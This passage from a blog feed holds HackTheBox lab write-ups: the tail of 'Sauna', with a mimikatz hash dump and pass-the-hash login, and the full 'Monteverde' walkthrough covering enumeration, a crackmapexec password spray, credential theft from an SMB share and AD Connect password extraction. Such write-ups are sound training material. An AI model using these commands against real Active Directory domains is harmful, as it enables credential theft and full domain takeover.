    ntlm- 0: d9485863c1e9e05851aa40cbb4ab9dff
    ntlm- 1: 7facdc498ed1680c4fd1448319a8c04f
    lm  - 0: ee8c50e6bc332970a8e8a632488f5211

Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : caab2b641b39e342e0bdfcd150b1683e

* Primary:Kerberos-Newer-Keys *
    Default Salt : EGOTISTICAL-BANK.LOCALAdministrator
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : 987e26bb845e57df4c7301753f6cb53fcf993e1af692d08fd07de74f041bf031
      aes128_hmac       (4096) : 145e4d0e4a6600b7ec0ece74997651d0
      des_cbc_md5       (4096) : 19d5f15d689b1ce5
    OldCredentials
      aes256_hmac       (4096) : 9637f48fa06f6eea485d26cd297076c5507877df32e4a47497f360106b3c95ef
      aes128_hmac       (4096) : 52c02b864f61f427d6ed0b22639849df
      des_cbc_md5       (4096) : d9379d13f7c15d1c

* Primary:Kerberos *
    Default Salt : EGOTISTICAL-BANK.LOCALAdministrator
    Credentials
      des_cbc_md5       : 19d5f15d689b1ce5
    OldCredentials
      des_cbc_md5       : d9379d13f7c15d1c

* Packages *
    NTLM-Strong-NTOWF

* Primary:WDigest *
    01  3fbea1ff422da035f1dc9b0ce45e84ea
    02  708091daa9db25abbd1d94246e4257e2
    03  417f2e40d5be8d436af749ed9fddb0b0
    04  3fbea1ff422da035f1dc9b0ce45e84ea
    05  50cb7cfb64edf83218804d934e30d431
    06  781dbcf7b8f9079382a1948f26f561ee
    07  4052111530264023a7d445957f5146e6
    08  8f4bffc5d94cc294272cd0c836e15c47
    09  0c81bc892ea87f7dd0f4a3a05b51f158
    10  f8c10a5bd37ea2568976d47ef12e55b9
    11  8f4bffc5d94cc294272cd0c836e15c47
    12  023b04503e3eef421de2fcaf8ba1297d
    13  613839caf0cf709da25991e2e5cb63cf
    14  16974c015c9905fb27e55a52dc14dfb0
    15  3c8af7ccd5e9bd131849990d6f18954b
    16  2b26fb63dcbf03fe68b67cdd2c72b6e6
    17  6eeda5f64e4adef4c299717eafbd2850
    18  3b32ec94978feeac76ba92b312114e2c
    19  b25058bc1ebfcac10605d39f65bff67f
    20  89e75cc6957728117eb1192e739e5235
    21  7e6d891c956f186006f07f15719a8a4e
    22  a2cada693715ecc5725a235d3439e6a2
    23  79e1db34d98ccd050b493138a3591683
    24  1f29ace4f232ebce1a60a48a45593205
    25  9233c8df5a28ee96900cc8b59a731923
    26  08c02557056f293aab47eccf1186c100
    27  695caa49e68da1ae78c1523b3442e230
    28  57d7b68bd2f06eae3ba10ca342e62a78
    29  3f14bb208435674e6a1cb8a957478c18

mimikatz(commandline) # exit
Bye! 
</code></pre></div></div>

<h3 id="getting-roottxt">Getting root.txt</h3>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>evil-winrm -u Administrator -H d9485863c1e9e05851aa40cbb4ab9dff -i sauna.htb
</code></pre></div></div>

<h2 id="and-we-get-the-shell-as-administrator">And we get the shell as administrator</h2>

<p><img src="/assets/img/sample/sauna-root.png" alt="" /></p>

<p>If you like my work, please do consider giving me +rep on HACKTHEBOX.</p>

<p>My HackTheBox profile: <a href="https://www.hackthebox.eu/home/users/profile/291968">https://www.hackthebox.eu/home/users/profile/291968</a></p>]]></content><author><name>jeevan</name></author><category term="[&quot;hackthebox&quot;, &quot;retired&quot;]" /><category term="windows" /><category term="activedirectory" /><category term="evilwinrm" /><category term="hashcat" /><category term="impacket" /><category term="bloodhound" /><category term="mimikatz" /><category term="rpcclient" /><summary type="html"><![CDATA[Sauna is one of the machines currently a Active machine on the HackTheBox hacking platform and is of easy difficulty. In this case it is a machine based on the Windows Operating System. Need to gather the user name from the aboutUs page, cracking the TGT of the users, cracking the hash of the user, running winPEAS, using BloodHound and mimikatz for privilege escalation.]]></summary></entry><entry><title type="html">HackTheBox Monteverde</title><link href="http://localhost:4000/hackthebox/retired/2020/06/12/Monteverde.html" rel="alternate" type="text/html" title="HackTheBox Monteverde" /><published>2020-06-12T11:40:00+05:30</published><updated>2020-06-12T11:40:00+05:30</updated><id>http://localhost:4000/hackthebox/retired/2020/06/12/Monteverde</id><content type="html" xml:base="http://localhost:4000/hackthebox/retired/2020/06/12/Monteverde.html"><![CDATA[<h2 id="lets-get-started">Let’s get started</h2>

<h3 id="tarting-with-nmap-scan-to-see-which-ports-are-open">$tarting with NMAP Scan to see which ports are open.</h3>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-12 01:39 EDT
    Nmap scan report for monteverde.htb (10.10.10.172)
    Host is up (0.35s latency).
    Not shown: 989 filtered ports
    PORT     STATE SERVICE       VERSION
    53/tcp   open  domain?
    | fingerprint-strings: 
    |   DNSVersionBindReqTCP: 
    |     version
    |_    bind
    88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2020-06-12 04:53:41Z)
    135/tcp  open  msrpc         Microsoft Windows RPC
    139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
    389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: MEGABANK.LOCAL0., Site: Default-First-Site-Name)
    445/tcp  open  microsoft-ds?
    464/tcp  open  kpasswd5?
    593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
    636/tcp  open  tcpwrapped
    3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: MEGABANK.LOCAL0., Site: Default-First-Site-Name)
    3269/tcp open  tcpwrapped
    1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
    SF-Port53-TCP:V=7.80%I=7%D=6/12%Time=5EE31533%P=x86_64-pc-linux-gnu%r(DNSV
    SF:ersionBindReqTCP,20,"\0\x1e\0\x06\x81\x04\0\x01\0\0\0\0\0\0\x07version\
    SF:x04bind\0\0\x10\0\x03");
    Service Info: Host: MONTEVERDE; OS: Windows; CPE: cpe:/o:microsoft:windows

    Host script results:
    |_clock-skew: -46m18s
    | smb2-security-mode: 
    |   2.02: 
    |_    Message signing enabled and required
    | smb2-time: 
    |   date: 2020-06-12T04:56:07
    |_  start_date: N/A
    Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
    Nmap done: 1 IP address (1 host up) scanned in 333.84 seconds` 
</code></pre></div></div>

<h3 id="enum4linux-as-the-next-step-if-i-can-see-any-user-names-and-some-juicy-information">Enum4linux as the next step if I can see any user names and some juicy information.</h3>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    ENUM4LINUX:
    =============================== 
    |    Users on monteverde.htb    |
    =============================== 
    Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 866.
    index: 0xfb6 RID: 0x450 acb: 0x00000210 Account: AAD_987d7f2f57d2       Name: AAD_987d7f2f57d2  Desc: Service account for the Synchronization Service with installation identifier 05c97990-7587-4a3d-b312-309adfc172d9 running on computer MONTEVERDE.
    index: 0xfd0 RID: 0xa35 acb: 0x00000210 Account: dgalanos       Name: Dimitris Galanos  Desc: (null)
    index: 0xedb RID: 0x1f5 acb: 0x00000215 Account: Guest  Name: (null)    Desc: Built-in account for guest access to the computer/domain
    index: 0xfc3 RID: 0x641 acb: 0x00000210 Account: mhope  Name: Mike Hope Desc: (null)
    index: 0xfd1 RID: 0xa36 acb: 0x00000210 Account: roleary        Name: Ray O'Leary       Desc: (null)
    index: 0xfc5 RID: 0xa2a acb: 0x00000210 Account: SABatchJobs    Name: SABatchJobs       Desc: (null)
    index: 0xfd2 RID: 0xa37 acb: 0x00000210 Account: smorgan        Name: Sally Morgan      Desc: (null)
    index: 0xfc6 RID: 0xa2b acb: 0x00000210 Account: svc-ata        Name: svc-ata   Desc: (null)
    index: 0xfc7 RID: 0xa2c acb: 0x00000210 Account: svc-bexec      Name: svc-bexec Desc: (null)
    index: 0xfc8 RID: 0xa2d acb: 0x00000210 Account: svc-netapp     Name: svc-netapp        Desc: (null)

    Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 881.
    user:[Guest] rid:[0x1f5]
    user:[AAD_987d7f2f57d2] rid:[0x450]
    user:[mhope] rid:[0x641]
    user:[SABatchJobs] rid:[0xa2a]
    user:[svc-ata] rid:[0xa2b]
    user:[svc-bexec] rid:[0xa2c]
    user:[svc-netapp] rid:[0xa2d]
    user:[dgalanos] rid:[0xa35]
    user:[roleary] rid:[0xa36]
    user:[smorgan] rid:[0xa37]
    =========================================== 
    |    Share Enumeration on monteverde.htb    |
    =========================================== 
    Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 640.
    Sharename       Type      Comment
    ---------       ----      -------
    SMB1 disabled -- no workgroup available
    [+] Attempting to map shares on monteverde.htb
    ====================================================== 
    |    Password Policy Information for monteverde.htb    |
    ====================================================== 
    [+] Attaching to monteverde.htb using a NULL share
    [+] Trying protocol 139/SMB...
    [!] Protocol failed: Cannot request session (Called Name:MONTEVERDE.HTB)
    [+] Trying protocol 445/SMB...
    [+] Found domain(s):
    [+] MEGABANK
    [+] Builtin
    [+] Password Info for Domain: MEGABANK
    [+] Minimum password length: 7
    [+] Password history length: 24
    [+] Maximum password age: 41 days 23 hours 53 minutes 
    [+] Password Complexity Flags: 000000
    [+] Domain Refuse Password Change: 0
    [+] Domain Password Store Cleartext: 0
    [+] Domain Password Lockout Admins: 0
    [+] Domain Password No Clear Change: 0
    [+] Domain Password No Anon Change: 0
    [+] Domain Password Complex: 0
    [+] Minimum password age: 1 day 4 minutes 
    [+] Reset Account Lockout Counter: 30 minutes 
    [+] Locked Account Duration: 30 minutes 
    [+] Account Lockout Threshold: None
    [+] Forced Log off Time: Not Set
    Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 501.
    [+] Retieved partial password policy with rpcclient:
    Password Complexity: Disabled
    Minimum Password Length: 7
    ================================ 
    |    Groups on monteverde.htb    |
    ================================ 
    Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 542.
    [+] Getting builtin groups:
    group:[Pre-Windows 2000 Compatible Access] rid:[0x22a]
    group:[Incoming Forest Trust Builders] rid:[0x22d]
    group:[Windows Authorization Access Group] rid:[0x230]
    group:[Terminal Server License Servers] rid:[0x231]
    group:[Users] rid:[0x221]
    group:[Guests] rid:[0x222]
    group:[Remote Desktop Users] rid:[0x22b]
    group:[Network Configuration Operators] rid:[0x22c]
    group:[Performance Monitor Users] rid:[0x22e]
    group:[Performance Log Users] rid:[0x22f]
    group:[Distributed COM Users] rid:[0x232]
    group:[IIS_IUSRS] rid:[0x238]
    group:[Cryptographic Operators] rid:[0x239]
    group:[Event Log Readers] rid:[0x23d]
    group:[Certificate Service DCOM Access] rid:[0x23e]
    group:[RDS Remote Access Servers] rid:[0x23f]
    group:[RDS Endpoint Servers] rid:[0x240]
    group:[RDS Management Servers] rid:[0x241]
    group:[Hyper-V Administrators] rid:[0x242]
    group:[Access Control Assistance Operators] rid:[0x243]
    group:[Remote Management Users] rid:[0x244]
    group:[Storage Replica Administrators] rid:[0x246]
    =========================================== 
    |    Share Enumeration on monteverde.htb    |
    =========================================== 
    Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 640.
    Sharename       Type      Comment
    ---------       ----      -------
    SMB1 disabled -- no workgroup available
    [+] Attempting to map shares on monteverde.htb
    ====================================================== 
    |    Password Policy Information for monteverde.htb    |
    ====================================================== 
    [+] Attaching to monteverde.htb using a NULL share
    [+] Trying protocol 139/SMB...
    [!] Protocol failed: Cannot request session (Called Name:MONTEVERDE.HTB)
    [+] Trying protocol 445/SMB...
    [+] Found domain(s):
    [+] MEGABANK
    [+] Builtin
    [+] Password Info for Domain: MEGABANK
    [+] Minimum password length: 7
    [+] Password history length: 24
    [+] Maximum password age: 41 days 23 hours 53 minutes 
    [+] Password Complexity Flags: 000000
    [+] Domain Refuse Password Change: 0
    [+] Domain Password Store Cleartext: 0
    [+] Domain Password Lockout Admins: 0
    [+] Domain Password No Clear Change: 0
    [+] Domain Password No Anon Change: 0
    [+] Domain Password Complex: 0
    [+] Minimum password age: 1 day 4 minutes 
    [+] Reset Account Lockout Counter: 30 minutes 
    [+] Locked Account Duration: 30 minutes 
    [+] Account Lockout Threshold: None
    [+] Forced Log off Time: Not Set
    Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 501.
    [+] Retieved partial password policy with rpcclient:
    Password Complexity: Disabled
    Minimum Password Length: 7
    ================================ 
    |    Groups on monteverde.htb    |
    ================================ 
    Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 542.
    [+] Getting builtin groups:
    group:[Pre-Windows 2000 Compatible Access] rid:[0x22a]
    group:[Incoming Forest Trust Builders] rid:[0x22d]
    group:[Windows Authorization Access Group] rid:[0x230]
    group:[Terminal Server License Servers] rid:[0x231]
    group:[Users] rid:[0x221]
    group:[Guests] rid:[0x222]
    group:[Remote Desktop Users] rid:[0x22b]
    group:[Network Configuration Operators] rid:[0x22c]
    group:[Performance Monitor Users] rid:[0x22e]
    group:[Performance Log Users] rid:[0x22f]
    group:[Distributed COM Users] rid:[0x232]
    group:[IIS_IUSRS] rid:[0x238]
    group:[Cryptographic Operators] rid:[0x239]
    group:[Event Log Readers] rid:[0x23d]
    group:[Certificate Service DCOM Access] rid:[0x23e]
    group:[RDS Remote Access Servers] rid:[0x23f]
    group:[RDS Endpoint Servers] rid:[0x240]
    group:[RDS Management Servers] rid:[0x241]
    group:[Hyper-V Administrators] rid:[0x242]
    group:[Access Control Assistance Operators] rid:[0x243]
    group:[Remote Management Users] rid:[0x244]
    group:[Storage Replica Administrators] rid:[0x246]
    [+] Getting local groups:
    group:[Cert Publishers] rid:[0x205]
    group:[RAS and IAS Servers] rid:[0x229]
    group:[Allowed RODC Password Replication Group] rid:[0x23b]
    group:[Denied RODC Password Replication Group] rid:[0x23c]
    group:[DnsAdmins] rid:[0x44d]
    group:[SQLServer2005SQLBrowserUser$MONTEVERDE] rid:[0x44f]
    group:[ADSyncAdmins] rid:[0x451]
    group:[ADSyncOperators] rid:[0x452]
    group:[ADSyncBrowse] rid:[0x453]
    group:[ADSyncPasswordSet] rid:[0x454]
</code></pre></div></div>

<h3 id="found-a-few-users-with-the-help-of-enum4linux">Found a few users with the help of Enum4Linux.</h3>

<p>So, to simplyfy the output I used RPCCLIENT for a detailed ennumeration.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    rpcclient $&gt; enumdomusers 
    user:[Guest] rid:[0x1f5]
    user:[AAD_987d7f2f57d2] rid:[0x450]
    user:[mhope] rid:[0x641]
    user:[SABatchJobs] rid:[0xa2a]
    user:[svc-ata] rid:[0xa2b]
    user:[svc-bexec] rid:[0xa2c]
    user:[svc-netapp] rid:[0xa2d]
    user:[dgalanos] rid:[0xa35]
    user:[roleary] rid:[0xa36]
    user:[smorgan] rid:[0xa37]
</code></pre></div></div>

<h3 id="quering-all-the-users-info-using-rpcclient-i-found-that-mhopes-is-the-member-of-azure-domain-admins">Quering all the users info using RPCCLIENT, I found that mhopes is the member of AZURE DOMAIN ADMIN’S.</h3>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    rpcclient $&gt; enumdomgroups 
    group:[Enterprise Read-only Domain Controllers] rid:[0x1f2]
    group:[Domain Users] rid:[0x201]
    group:[Domain Guests] rid:[0x202]
    group:[Domain Computers] rid:[0x203]
    group:[Group Policy Creator Owners] rid:[0x208]
    group:[Cloneable Domain Controllers] rid:[0x20a]
    group:[Protected Users] rid:[0x20d]
    group:[DnsUpdateProxy] rid:[0x44e]
    group:[Azure Admins] rid:[0xa29]
    group:[File Server Admins] rid:[0xa2e]
    group:[Call Recording Admins] rid:[0xa2f]
    group:[Reception] rid:[0xa30]
    group:[Operations] rid:[0xa31]
    group:[Trading] rid:[0xa32]
    group:[HelpDesk] rid:[0xa33]
    group:[Developers] rid:[0xa34]


                
    rpcclient $&gt; queryuser 0x641
    User Name   :   mhope
    Full Name   :   Mike Hope
    Home Drive  :   \\monteverde\users$\mhope
    Dir Drive   :   H:
    Profile Path:
    Logon Script:
    Description :
    Workstations:
    Comment     :
    Remote Dial :
    Logon Time               :      Fri, 12 Jun 2020 05:40:35 EDT
    Logoff Time              :      Wed, 31 Dec 1969 19:00:00 EST
    Kickoff Time             :      Wed, 13 Sep 30828 22:48:05 EDT
    Password last set Time   :      Thu, 02 Jan 2020 18:40:06 EST
    Password can change Time :      Fri, 03 Jan 2020 18:40:06 EST
    Password must change Time:      Wed, 13 Sep 30828 22:48:05 EDT
    unknown_2[0..31]...
    user_rid :      0x641
    group_rid:      0x201
    acb_info :      0x00000210
    fields_present: 0x00ffffff
    logon_divs:     168
    bad_password_count:     0x00000000
    logon_count:    0x00000002
    padding1[0..7]...
    logon_hrs[0..21]...
</code></pre></div></div>

<h3 id="so-i-quickly-made-the-user-list-and-tries-with-a-different-password-lists-but-no-luck-unfortunately-a-quick-idea-popped-into-my-mind-and-then-i-used-the-same-username-list-as-the-password-list-for-the-password-spray-using-crackmapexec">So I quickly made the user list and tries with a different password list(s), But no luck unfortunately. A quick idea popped into my mind and then I used the same username list as the password list for the password spray using crackmapexec.</h3>
<h4 id="crackmapexec">crackmapexec</h4>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    SMB 10.10.10.172    445    MONTEVERDE       [*] Windows 10.0 Build 17763 (name:MONTEVERDE) (domain:MEGABANK.LOCAL) (signing:True) (SMBv1:False)
    SMB 10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\AAD_987d7f2f57d2:SABatchJobs STATUS_LOGON_FAILURE 
    SMB 10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\AAD_987d7f2f57d2:AAD_987d7f2f57d2 STATUS_LOGON_FAILURE 
    SMB 10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\AAD_987d7f2f57d2:mhope STATUS_LOGON_FAILURE 
    SMB 10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\AAD_987d7f2f57d2:svc-ata STATUS_LOGON_FAILURE 
    SMB 10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\AAD_987d7f2f57d2:svc-bexec STATUS_LOGON_FAILURE 
    SMB 10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\AAD_987d7f2f57d2:svc-netapp STATUS_LOGON_FAILURE 
    SMB 10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\AAD_987d7f2f57d2:dgalanos STATUS_LOGON_FAILURE 
    SMB 10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\AAD_987d7f2f57d2:roleary STATUS_LOGON_FAILURE 
    SMB 10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\AAD_987d7f2f57d2:smorgan STATUS_LOGON_FAILURE 
    SMB 10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\mhope:SABatchJobs STATUS_LOGON_FAILURE 
    SMB 10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\mhope:AAD_987d7f2f57d2 STATUS_LOGON_FAILURE 
    SMB 10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\mhope:mhope STATUS_LOGON_FAILURE 
    SMB 10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\mhope:svc-ata STATUS_LOGON_FAILURE 
    SMB 10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\mhope:svc-bexec STATUS_LOGON_FAILURE 
    SMB 10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\mhope:svc-netapp STATUS_LOGON_FAILURE 
    SMB 10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\mhope:dgalanos STATUS_LOGON_FAILURE 
    SMB 10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\mhope:roleary STATUS_LOGON_FAILURE 
    SMB 10.10.10.172    445    MONTEVERDE       [-] MEGABANK.LOCAL\mhope:smorgan STATUS_LOGON_FAILURE 
    SMB 10.10.10.172    445    MONTEVERDE       [+] MEGABANK.LOCAL\SABatchJobs:SABatchJobs 
</code></pre></div></div>

<h3 id="cracking-the-password-of-sabatchjobs-and-using-evil-winrm-didnt-return-anything-so-i-moved-on-trying-with-smb">Cracking the password of SABatchJobs and using Evil-WinRM didn’t return anything! So I moved on trying with SMB.</h3>
<h4 id="smbclient">SMBCLIENT</h4>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    smbclient -L  monteverde.htb -U SABatchJobs
    Enter WORKGROUP\SABatchJobs's password: 
    Sharename       Type      Comment
    ---------       ----      -------
    ADMIN$          Disk      Remote Admin
    azure_uploads   Disk      
    C$              Disk      Default share
    E$              Disk      Default share
    IPC$            IPC       Remote IPC
    NETLOGON        Disk      Logon server share 
    SYSVOL          Disk      Logon server share 
    users$          Disk      
    SMB1 disabled -- no workgroup available

              
    smbclient //monteverde.htb/users$ -U SABatchJobs
    Enter WORKGROUP\SABatchJobs's password: 
    Try "help" to get a list of possible commands.
    smb: \&gt; ls
    .                                   D        0  Fri Jan  3 08:12:48 2020
    ..                                  D        0  Fri Jan  3 08:12:48 2020
    dgalanos                            D        0  Fri Jan  3 08:12:30 2020
    mhope                               D        0  Fri Jan  3 08:41:18 2020
    roleary                             D        0  Fri Jan  3 08:10:30 2020
    smorgan                             D        0  Fri Jan  3 08:10:24 2020
    524031 blocks of size 4096\. 519955 blocks available
    smb: \&gt; cd mhope
    smb: \mhope\&gt; ls
    .                                   D        0  Fri Jan  3 08:41:18 2020
    ..                                  D        0  Fri Jan  3 08:41:18 2020
    azure.xml                          AR     1212  Fri Jan  3 08:40:23 2020
    524031 blocks of size 4096\. 519955 blocks available
    smb: \mhope\&gt; get azure.xml
    getting file \mhope\azure.xml of size 1212 as azure.xml (1.5 KiloBytes/sec) (average 1.5 KiloBytes/sec) 
</code></pre></div></div>

<h3 id="looking-at-azurexml-file-password-of-mhope-is-found">Looking at AZURE.xml file, password of mhope is found!</h3>
<p>Then using Evil-WinRM I was able to login as MHOPE.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    cat azure.xml   

    &lt;t&gt;Microsoft.Azure.Commands.ActiveDirectory.PSADPasswordCredential&lt;/t&gt;
    &lt;t&gt;System.Object&lt;/t&gt;
    &lt;tostring&gt;Microsoft.Azure.Commands.ActiveDirectory.PSADPasswordCredential&lt;/tostring&gt;

    &lt;dt n="StartDate"&gt;2020-01-03T05:35:00.7562298-08:00&lt;/dt&gt;

    &lt;dt n="EndDate"&gt;2054-01-03T05:35:00.7562298-08:00&lt;/dt&gt;

    &lt;g n="KeyId"&gt;00000000-0000-0000-0000-000000000000&lt;/g&gt;
    &lt;s n="Password"&gt;4n0therD4y@n0th3r$&lt;/s&gt; 
</code></pre></div></div>

<h2 id="getting-usertxt">Getting user.txt</h2>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    evil-winrm -i monteverde.htb -u mhope -p 4n0therD4y@n0th3r$

    Evil-WinRM shell v2.3

    Info: Establishing connection to remote endpoint

    *Evil-WinRM* PS C:\Users\mhope\Documents&gt; cd ..
    *Evil-WinRM* PS C:\Users\mhope&gt; cd Desktop
    *Evil-WinRM* PS C:\Users\mhope\Desktop&gt; cat user.txt
    [4961************************12f2]
</code></pre></div></div>

<h2 id="privilege-escalation">Privilege Escalation</h2>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    USER INFORMATION
    ----------------
    User Name      SID
    ============== ============================================
    megabank\mhope S-1-5-21-391775091-850290835-3566037492-1601
    GROUP INFORMATION
    -----------------
    Group Name                                  Type             SID                                          Attributes
    =========================================== ================ ============================================ ==================================================
    Everyone                                    Well-known group S-1-1-0                                      Mandatory group, Enabled by default, Enabled group
    BUILTIN\Remote Management Users             Alias            S-1-5-32-580                                 Mandatory group, Enabled by default, Enabled group
    BUILTIN\Users                               Alias            S-1-5-32-545                                 Mandatory group, Enabled by default, Enabled group
    BUILTIN\Pre-Windows 2000 Compatible Access  Alias            S-1-5-32-554                                 Mandatory group, Enabled by default, Enabled group
    NT AUTHORITY\NETWORK                        Well-known group S-1-5-2                                      Mandatory group, Enabled by default, Enabled group
    NT AUTHORITY\Authenticated Users            Well-known group S-1-5-11                                     Mandatory group, Enabled by default, Enabled group
    NT AUTHORITY\This Organization              Well-known group S-1-5-15                                     Mandatory group, Enabled by default, Enabled group
    MEGABANK\Azure Admins                       Group            S-1-5-21-391775091-850290835-3566037492-2601 Mandatory group, Enabled by default, Enabled group
    NT AUTHORITY\NTLM Authentication            Well-known group S-1-5-64-10                                  Mandatory group, Enabled by default, Enabled group
    Mandatory Label\Medium Plus Mandatory Level Label            S-1-16-8448
    PRIVILEGES INFORMATION
    ----------------------
    Privilege Name                Description                    State
    ============================= ============================== =======
    SeMachineAccountPrivilege     Add workstations to domain     Enabled
    SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
    SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
    USER CLAIMS INFORMATION
    -----------------------
    User claims unknown.
    Kerberos support for Dynamic Access Control on this device has been disabled. 
</code></pre></div></div>

<p>Seeing that [mhope] is a member of Azure Admin group [MEGABANK\Azure Admins]. This means mhope must me having the administrator rights on the domain. Looking for the exploit in google for quite a good time I came across a [powershell] script [AzureConnect]. So this script will return the Administrator password in Cleartext format. So I created a new file [adconnect.ps1] with the powershell script in it and uploaded the script.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    *Evil-WinRM* PS C:\Users\mhope\Desktop&gt; upload adconnect.ps1
    Info: Uploading adconnect.ps1 to C:\Users\mhope\Desktop\adconnect.ps1

    Data: 2936 bytes of 2936 bytes copied
    Info: Upload successful!

    *Evil-WinRM* PS C:\Users\mhope\Desktop&gt; dir
    Directory: C:\Users\mhope\Desktop
    Mode                LastWriteTime         Length Name
    ----                -------------         ------ ----
    -a----        6/11/2020  11:04 PM           2202 adconnect.ps1
    -ar---         1/3/2020   5:48 AM             32 user.txt` 
</code></pre></div></div>

<p>This script needs to run in locally as I have a shell as mhope.<br />
To have a more indepth view have a look on the below video.
<br /></p>

<p><a href="http://www.youtube.com/watch?v=JEIR5oGCwdg" title="hacking Azure AD via Active Directory"><img src="/assets/img/sample/montasure.png" alt="" /></a></p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    *Evil-WinRM* PS C:\Users\mhope\Desktop&gt; import-module ./adconnect.ps1
    *Evil-WinRM* PS C:\Users\mhope\Desktop&gt; ./adconnect.ps1
    *Evil-WinRM* PS C:\Users\mhope\Desktop&gt; Azure-ADConnect -server 127.0.0.1 -db ADSync
    [+] Domain:  MEGABANK.LOCAL
    [+] Username: administrator
    [+]Password: d0m@in4dminyeah! 
</code></pre></div></div>

<h2 id="getting-roottxt">Getting root.txt</h2>

<p>So, as I got the PASSWORD of Administrator, I can login as Administrator using Evil-WinRM and grab the root flag.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    evil-winrm -i monteverde.htb -u Administrator -p d0m@in4dminyeah!

    Evil-WinRM shell v2.3
    Info: Establishing connection to remote endpoint

    *Evil-WinRM* PS C:\Users\Administrator\Documents&gt; cd ..
    *Evil-WinRM* PS C:\Users\Administrator&gt; cd Desktop
    *Evil-WinRM* PS C:\Users\Administrator\Desktop&gt; cat root.txt
    [1290************************a0bc]
    *Evil-WinRM* PS C:\Users\Administrator\Desktop&gt; 
</code></pre></div></div>

<h2 id="and-we-get-the-shell-as-administrator">And we get the shell as administrator</h2>

<p><img src="/assets/img/sample/monteverde.png" alt="" /></p>

<p>If you like my work, please do consider giving me +rep on HACKTHEBOX.</p>

<p>My HackTheBox profile: <a href="https://www.hackthebox.eu/home/users/profile/291968">https://www.hackthebox.eu/home/users/profile/291968</a></p>]]></content><author><name>jeevan</name></author><category term="[&quot;hackthebox&quot;, &quot;retired&quot;]" /><category term="windows" /><category term="activedirectory" /><category term="evilwinrm" /><category term="hashcat" /><category term="impacket" /><category term="crackmapexec" /><category term="rpcclient" /><summary type="html"><![CDATA[Giving a try with enum4linux I was able to get some information about the machine like the usernames, password policies, etc. Finding that right password the right user took me a bit of more time than I expected.This machine is about Azure AD Connect Database Exploit. So in order to get the shell of administrator I need to have a shell of privileged user of the local domain, so that I can perform various attacks.]]></summary></entry></feed>